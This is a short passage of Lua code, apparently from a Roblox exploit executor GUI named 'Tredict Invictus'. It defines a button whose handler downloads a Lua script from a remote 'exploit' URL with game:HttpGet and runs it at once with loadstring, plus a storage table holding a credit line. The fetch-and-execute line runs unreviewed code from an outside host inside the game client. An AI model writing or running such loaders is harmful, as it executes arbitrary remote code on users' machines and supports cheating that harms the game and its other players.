...
CreateButton(PageTools, "ExecXayz", function()
    pcall(function()
        loadstring(game:HttpGet("https://Tredict-Invictus-exploit/script/TredictInvictus-2.lua"))()
    end)
...
local ScriptStorage = {
    ["Tab 1"] = "print('Tredict Invictus By Xatanicvxii')"
}
